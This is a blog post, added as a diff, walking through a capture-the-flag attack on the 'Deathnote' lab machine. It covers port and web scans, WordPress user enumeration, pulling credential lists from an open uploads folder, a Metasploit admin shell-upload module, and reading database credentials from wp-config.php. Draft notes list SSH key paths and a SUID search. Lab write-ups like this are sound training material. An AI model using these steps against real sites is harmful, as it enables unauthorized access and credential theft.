@@ -1,0 +1,192 @@
+---
+layout: post
+category : boxes
+title: Deathnote box!
+---
+
+## Enumeration
+
+
+For this box, running the command `sudo arp-scan -l ` shows that the machine in running on the IP:192.168.88.53
+
+Since we now know the IP address of the box, we can now scan for open ports and see what kind of services are running on the machine
+
+<div class="highlight-code">
+<code>nmap -T4 --max-retries 1 -Pn -p- -sV --script=vuln $x -v</code><br/>
+<code></code><br/>
+<code>Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-03 11:06 EAT</code><br/>
+<code>NSE: Loaded 142 scripts for scanning.</code><br/>
+<code>NSE: Script Pre-scanning.</code><br/>
+<code>Initiating NSE at 11:06</code><br/>
+<code>Completed NSE at 11:06, 10.00s elapsed</code><br/>
+<code>Initiating NSE at 11:06</code><br/>
+<code>Completed NSE at 11:06, 0.00s elapsed</code><br/>
+<code>Initiating Parallel DNS resolution of 1 host. at 11:06</code><br/>
+<code>Completed Parallel DNS resolution of 1 host. at 11:06, 13.00s elapsed</code><br/>
+<code>Initiating Connect Scan at 11:06</code><br/>
+<code>Scanning 192.168.88.53 [65535 ports]</code><br/>
+<code>Discovered open port 22/tcp on 192.168.88.53</code><br/>
+<code>Discovered open port 80/tcp on 192.168.88.53</code><br/>
+<code>Completed Connect Scan at 11:06, 2.36s elapsed (65535 total ports)</code><br/>
+<code>Initiating Service scan at 11:06</code><br/>
+<code>Scanning 2 services on 192.168.88.53</code><br/>
+<code>Completed Service scan at 11:06, 6.03s elapsed (2 services on 1 host)</code><br/>
+<code>NSE: Script scanning 192.168.88.53.</code><br/>
+<code>Initiating NSE at 11:06</code><br/>
+<code>NSE: [firewall-bypass] lacks privileges.</code><br/>
+<code>NSE: [tls-ticketbleed] Not running due to lack of privileges.</code><br/>
+<code>Completed NSE at 11:07, 23.82s elapsed</code><br/>
+<code>Initiating NSE at 11:07</code><br/>
+<code>Completed NSE at 11:07, 0.12s elapsed</code><br/>
+<code>Nmap scan report for 192.168.88.53</code><br/>
+<code>Host is up (0.0077s latency).</code><br/>
+<code>Not shown: 65533 closed ports</code><br/>
+<code>PORT&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</code><br/>
+<code>22/tcp open&nbsp;&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</code><br/>
+<code>80/tcp open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache httpd 2.4.38 ((Debian))</code><br/>
+<code>|_http-csrf: Couldn't find any CSRF vulnerabilities.</code><br/>
+<code>|_http-dombased-xss: Couldn't find any DOM based XSS.</code><br/>
+<code>| http-enum: </code><br/>
+<code>|&nbsp;&nbsp;&nbsp; /wordpress/: Blog</code><br/>
+<code>|&nbsp;&nbsp;&nbsp; /robots.txt: Robots file</code><br/>
+<code>|&nbsp;&nbsp;&nbsp; /wordpress/wp-login.php: Wordpress login page.</code><br/>
+<code>|_&nbsp;&nbsp;&nbsp;/manual/: Potentially interesting folder</code><br/>
+<code>|_http-server-header: Apache/2.4.38 (Debian)</code><br/>
+<code>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</code><br/>
+<code>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code><br/>
+<code></code><br/>
+<code>NSE: Script Post-scanning.</code><br/>
+<code>Initiating NSE at 11:07</code><br/>
+<code>Completed NSE at 11:07, 0.00s elapsed</code><br/>
+<code>Initiating NSE at 11:07</code><br/>
+<code>Completed NSE at 11:07, 0.00s elapsed</code><br/>
+<code>Read data files from: /usr/bin/../share/nmap</code><br/>
+<code>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</code><br/>
+<code>Nmap done: 1 IP address (1 host up) scanned in 73.04 seconds</code><br/>
+</div>
+
+From the scan above, we can see that two services are running on the machine, ssh and http. We can also see that the paths /wordpress,/manual and /robots.txt are available. The contents of robots.txt are as follows
+
+<div class="highlight-code"><code>fuck it my dad </code><br/><code>added hint on /important.jpg</code><br/><code></code><br/><code>ryuk please delete it</code><br/></div>
+
+The contents of important.jpg are 
+<div class="highlight-code"><code>i am Soichiro Yagami, light's father</code><br/><code>i have a doubt if L is true about the assumption that light is kira</code><br/><code>i can only help you by giving something important</code><br/><code>login username : user.txt</code><br/><code>i don't know the password.</code><br/><code>find it by yourself </code><br/><code>but i think it is in the hint section of site</code><br/><code></code><br/><code>iamjustic3</code><br/></div>
+
+The last line looks like a password, we take note of it.
+
+Since we know that the machine is running a wordpress site, we can try and enumerate users using the following command
+
+<div class="highlight-code"><code>curl -X GET http://192.168.88.53/wordpress/?rest_route=/wp/v2/users</code><br/><code></code><br/><code>[{"id":1,"name":"kira","url":"http:\/\/deathnote.vuln\/wordpress","description":"","link":"http:\/\/deathnote.vuln\/wordpress\/index.php\/author\/kira\/","slug":"kira","avatar_urls":{"24":"http:\/\/1.gravatar.com\/avatar\/1019994ac6a06c163a21d4109310712b?s=24&d=mm&r=g","48":"http:\/\/1.gravatar.com\/avatar\/1019994ac6a06c163a21d4109310712b?s=48&d=mm&r=g","96":"http:\/\/1.gravatar.com\/avatar\/1019994ac6a06c163a21d4109310712b?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/deathnote.vuln\/wordpress\/index.php\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"http:\/\/deathnote.vuln\/wordpress\/index.php\/wp-json\/wp\/v2\/users"}]}}]</code><br/></div>
+
+We can only identify one user by the name `kira` which we take note of. We can also try to find some known vulnerabilities using nikto as follows  
+
+
+
+<div class="highlight-code"><code>nikto -h http://deathnote.vuln</code><br/><code>- Nikto v2.1.5</code><br/><code>---------------------------------------------------------------------------</code><br/><code>+ Target IP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.88.53</code><br/><code>+ Target Hostname:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deathnote.vuln</code><br/><code>+ Target Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80</code><br/><code>+ Start Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2022-04-03 11:36:21 (GMT3)</code><br/><code>---------------------------------------------------------------------------</code><br/><code>+ Server: Apache/2.4.38 (Debian)</code><br/><code>+ Server leaks inodes via ETags, header found with file /, fields: 0xc5 0x5cb285991624e </code><br/><code>+ The anti-clickjacking X-Frame-Options header is not present.</code><br/><code>+ No CGI Directories found (use '-C all' to force check all possible dirs)</code><br/><code>+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).</code><br/><code>+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD </code><br/><code>+ OSVDB-3092: /manual/: Web server manual found.</code><br/><code>+ OSVDB-3268: /manual/images/: Directory indexing found.</code><br/><code>+ OSVDB-3233: /icons/README: Apache default file found.</code><br/><code>+ Uncommon header 'link' found, with contents: <http://deathnote.vuln/wordpress/index.php/wp-json/>; rel="https://api.w.org/"</code><br/><code>+ /wordpress/: A Wordpress installation was found.</code><br/><code>+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host</code><br/></div>
+
+
+
+We also don't find anything interesting from the scan above. We can try to bruteforce directories to find hidden ones. For this we can use ffuf as show below
+
+<div class="highlight-code"><code>ffuf -c -r -w /usr/share/dirb/wordlists/common.txt -u http://deathnote.vuln/FUZZ</code><br/><code></code><br/><code>________________________________________________</code><br/><code></code><br/><code> :: Method&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : GET</code><br/><code> :: URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: http://deathnote.vuln/FUZZ</code><br/><code> :: Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : FUZZ: /usr/share/dirb/wordlists/common.txt</code><br/><code> :: Follow redirects : true</code><br/><code> :: Calibration&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: false</code><br/><code> :: Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 10</code><br/><code> :: Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 40</code><br/><code> :: Matcher&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Response status: 200,204,301,302,307,401,403,405</code><br/><code>________________________________________________</code><br/><code></code><br/><code>.hta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3ms]</code><br/><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 200, Size: 197, Words: 23, Lines: 10, Duration: 4ms]</code><br/><code>.htaccess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5ms]</code><br/><code>.htpasswd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]</code><br/><code>index.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 200, Size: 197, Words: 23, Lines: 10, Duration: 6ms]</code><br/><code>manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 200, Size: 626, Words: 14, Lines: 13, Duration: 6ms]</code><br/><code>robots.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 6ms]</code><br/><code>server-status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]</code><br/><code>wordpress&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Status: 200, Size: 17961, Words: 583, Lines: 144, Duration: 60ms]</code><br/><code>:: Progress: [4614/4614] :: Job [1/1] :: 5228 req/sec :: Duration: [0:00:03] :: Errors: 0 ::</code><br/></div>
+
+Checking the main wordpress page, we find the following content
+
+<div class="highlight-code"><code>Find a notes.txt file on server</code><br/><code>or</code><br/><code>SEE the L comment</code><br/><code>my fav line is iamjustic3</code><br/><code>L on i will eliminate you L!</code><br/></div>
+
+A good place to start looking for the user.txt and notes.txt is the upload directory in wordpress which can be accessed using the link `http://192.168.88.53/wordpress/wp-content/uploads/2021/` . Since it allows directory indexing, accessing the files is easy.Contents of the user.txt file are 
+
+
+<div class="highlight-code"><code>curl -X GET http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</code><br/><code></code><br/><code>KIRA</code><br/><code>L</code><br/><code>ryuk</code><br/><code>rem</code><br/><code>misa</code><br/><code>siochira </code><br/><code>light</code><br/><code>takada</code><br/><code>near</code><br/><code>mello</code><br/><code>l</code><br/><code>kira</code><br/><code>RYUK</code><br/><code>REM</code><br/><code>SIOCHIRA</code><br/><code>LIGHT</code><br/><code>NEAR</code><br/></div>
+
+Contents of the notes.txt file are
+<div class="highlight-code"><code>curl -X GET http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</code><br/><code></code><br/><code>death4</code><br/><code>death4life</code><br/><code>death4u</code><br/><code>death4ever</code><br/><code>death4all</code><br/><code>death420</code><br/><code>death45</code><br/><code>death4love</code><br/><code>death49</code><br/><code>death48</code><br/><code>death456</code><br/><code>death4014</code><br/><code>1death4u</code><br/><code>yaydeath44</code><br/><code>thedeath4u2</code><br/><code>thedeath4u</code><br/><code>stickdeath420</code><br/><code>reddeath44</code><br/><code>megadeath44</code><br/><code>megadeath4</code><br/><code>killdeath405</code><br/><code>hot2death4sho</code><br/><code>death4south</code><br/><code>death4now</code><br/><code>death4l0ve</code><br/><code>death4free</code><br/><code>death4elmo</code><br/><code>death4blood</code><br/><code>death499Eyes301</code><br/><code>death498</code><br/><code>death4859</code><br/><code>death47</code><br/><code>death4545</code><br/><code>death445</code><br/><code>death444</code><br/><code>death4387n</code><br/><code>death4332387</code><br/><code>death42521439</code><br/><code>death42</code><br/><code>death4138</code><br/><code>death411</code><br/><code>death405</code><br/><code>death4me</code><br/></div>
+
+
+Once all the necessary information has been collected, we can try to login in using the following information
+
+<div class="highlight-code"><code>http://deathnote.vuln/wordpress/wp-login.php</code><br/><code>username : kira</code><br/><code>password : iamjustic3 ( found at http://deathnote.vuln/wordpress/)</code><br/></div>
+
+
+We can also upload a shell for remote access using the following metasploit module 
+
+<div class="highlight-code"><code>exploit/unix/webapp/wp_admin_shell_upload</code><br/></div>
+
+Once the shell is uploaded, we can try to read the config files to reveal extra credentials, below is an example of wp-config.php file with credentials we can use 
+
+<div class="highlight-code"><code></code><br/><code>/** MySQL database username */</code><br/><code>define( 'DB_USER', 'l' );</code><br/><code></code><br/><code>/** MySQL database password */</code><br/><code>define( 'DB_PASSWORD', 'death4me' );</code><br/><code></code><br/><code>/** MySQL hostname */</code><br/><code>define( 'DB_HOST', 'localhost' );</code><br/><code></code><br/><code>/** Database Charset to use in creating database tables. */</code><br/><code>define( 'DB_CHARSET', 'utf8mb4' );</code><br/><code></code><br/><code>/** The Database Collate type. Don't change this if in doubt. */</code><br/><code>define( 'DB_COLLATE', '' );</code><br/></div>
+
+
+<!-- ### Loggin in 
+```
+username is l
+password is death4me
+```
+
+### Interesting files
+```
+/home/l/.bash_logout
+/home/l/.bash_history
+/home/l/.profile
+/home/l/user.txt
+/home/l/.bashrc
+/home/l/.ssh/id_rsa.pub
+/home/l/.ssh/id_rsa
+/home/l/.ssh/known_hosts
+/home/kira/.bash_logout
+/home/kira/.bash_history
+/home/kira/.profile
+/home/kira/kira.txt
+/home/kira/.bashrc
+/home/kira/.ssh/authorized_keys
+
+```
+
+
+### user.txt
+```
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
+
+translates to i think u got the shell , but you wont be able to kill me -kira in brainfuck
+```
+
+## Fuzzing php files
+```
+http://deathnote.vuln/wordpress/wp-admin/includes/admin.php
+```
+
+
+## Payload - Metasploit
+```
+exploit/unix/webapp/wp_admin_shell_upload
+```
+
+### Uploading a better shell
+```
+
+```
+
+### Searching for files in the /var/www/html/ directory
+```
+
+```
+
+### Searching for files in the home folder
+```
+
+```
+
+### Reading user.txt
+```
+
+```
+
+### Finding suid binaries
+find / -perm -u=s -type f 2>/dev/null
+```
+
+
+```
+ -->
+
+			
